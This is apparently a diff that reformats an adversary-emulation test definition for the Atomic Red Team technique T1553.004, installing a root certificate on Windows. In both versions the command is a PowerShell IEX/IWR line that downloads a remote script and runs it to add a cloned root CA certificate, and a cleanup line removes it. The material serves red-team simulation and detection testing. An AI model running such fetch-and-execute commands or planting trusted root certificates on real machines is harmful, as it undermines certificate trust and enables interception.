@@ -1,4 +1,4 @@
-- id: b7862ffd-a0dc-52ae-af3c-d7bb0377fef5
+- requirements: []
   name: Soumaia ART Tests - Add Root Certificate to CurrentUser Certificate Store
   description: 'The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.
 
@@ -6,13 +6,15 @@
 
     Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec (requires elevation)'
   tactic: defense-impairment
-  technique:
-    attack_id: T1553.004
-    name: 'Subvert Trust Controls: Install Root Certificate'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)
-        cleanup: |-
-          Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item
+  technique_id: T1553.004
+  technique_name: 'Subvert Trust Controls: Install Root Certificate'
+  executors:
+  - cleanup:
+    - Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)
+  id: b7862ffd-a0dc-52ae-af3c-d7bb0377fef5
